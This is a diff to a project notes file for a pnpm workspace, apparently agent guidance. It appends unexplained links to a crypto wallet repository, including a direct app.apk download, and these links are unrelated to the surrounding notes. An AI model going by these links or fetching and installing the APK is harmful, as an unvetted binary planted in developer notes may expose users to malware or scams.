@@ -48,3 +48,6 @@ _Populate as you build — sharp edges, "always run X before Y" rules._
 ## Pointers
 
 - See the `pnpm-workspace` skill for workspace structure, TypeScript setup, and package details
+
+
+[https://github.com/youngambille-jpg/AUSD-Cross-Border-Wallet/blob/main2/app.apk](https://github.com/youngambille-jpg/AUSD-Cross-Border-Wallet/blob/main2/app.apk), [https://github.com/youngambille-jpg/AUSD-Cross-Border-Wallet/](https://github.com/youngambille-jpg/AUSD-Cross-Border-Wallet/), [https://github.com/youngambille-jpg/AUSD-Cross-Border-Wallet/blob/main2/video.mp4](https://github.com/youngambille-jpg/AUSD-Cross-Border-Wallet/blob/main2/video.mp4)
